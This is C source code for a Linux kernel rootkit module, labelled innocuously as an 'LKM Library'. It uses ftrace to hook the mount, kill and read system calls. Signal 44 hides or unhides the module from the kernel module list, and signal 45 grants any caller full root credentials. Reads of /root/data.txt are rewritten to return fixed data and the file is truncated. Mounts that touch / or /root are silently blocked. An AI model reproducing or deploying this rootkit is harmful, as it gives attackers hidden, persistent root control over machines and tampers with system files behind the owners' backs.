#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/cred.h>     // for struct creds, prepare_creds, commit_creds
#include <linux/fs.h>       
#include <linux/uaccess.h>  // for copy_to_user
#include <linux/slab.h>     // for kmalloc and kfree
#include <linux/dcache.h>   // for dentry_path_raw 
#include <linux/file.h>     // for fget and fput
#include <linux/ptrace.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library");
MODULE_VERSION("0.02");

#define TARGET_FILE "/root/data.txt"
#define DATA "data\n"
#define DATA_LEN (strlen(DATA))

static struct list_head *prev_module;
static short hidden = 0;


static asmlinkage long (*orig_mount)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_read)(const struct pt_regs *);

asmlinkage long hook_mount(const struct pt_regs *regs)
{
    char __user *source = (void *)regs->si;
    char __user *target = (void *)regs->di;

    char *target_buf;
    char *source_buf;

    target_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!target_buf) return -ENOMEM;
    
    source_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!source_buf){
        kfree(target_buf);
        return -ENOMEM;
    }
    

    if (copy_from_user(source_buf, source, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (copy_from_user(target_buf, target, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (   strcmp(source_buf, TARGET_FILE) == 0 || strcmp(source_buf, "/root") == 0
        || strcmp(source_buf, "/")         == 0 || strcmp(target_buf, TARGET_FILE) == 0 
        || strcmp(target_buf, "/root")     == 0 || strcmp(target_buf, "/") == 0)  {
        
        kfree(source_buf);
        kfree(target_buf);
        return 0;
    }

    kfree(source_buf);
    kfree(target_buf);
    return orig_mount(regs);
}

asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(regs);
}


asmlinkage ssize_t hook_read(struct pt_regs *regs){
   struct file *file;
   char *buff;
   char *absolute_path;
   
   unsigned int fd = regs->si;
   char __user *buf = (void *) regs->di;
   size_t count = regs->dx;

   file = fget(fd);
   if (!file) return -EBADF;

   buff = kmalloc(PATH_MAX, GFP_KERNEL);
   if (!buff){
        fput(file);
        return -ENOMEM;
   }
   
   absolute_path = dentry_path_raw(file->f_path.dentry, buff, PATH_MAX);

   if (strcmp(absolute_path, TARGET_FILE) == 0){
        loff_t pos;
        ssize_t ret;

        // make the file size equal to DATA_LEN
        // even if the file had nothing or less that
        // DATA len the len will always be equal 
        // to DATA_LEN
        vfs_truncate(&file->f_path, DATA_LEN);

        pos = file->f_pos;

        // this is cause no more bytes can be read
        // and we use this to indicate EOF (end of file)
        if (pos ==  DATA_LEN){
           ret = 0; 
           goto done;
        } 

        if (count > DATA_LEN) count = DATA_LEN;
        count = count  - pos;
        
        if (copy_to_user(buf, DATA, DATA_LEN)){
            ret = -EFAULT;
            goto done;
        }

        file->f_pos += count;
        ret = count;
        goto done;

       done:
            kfree(buff);
            fput(file);
            return ret;

   }

   kfree(buff);
   fput(file);
   return orig_read(regs);
}
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_mount", hook_mount, &orig_mount),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_read", hook_read, &orig_read),
};

static int rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    return 0;
}

static void rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
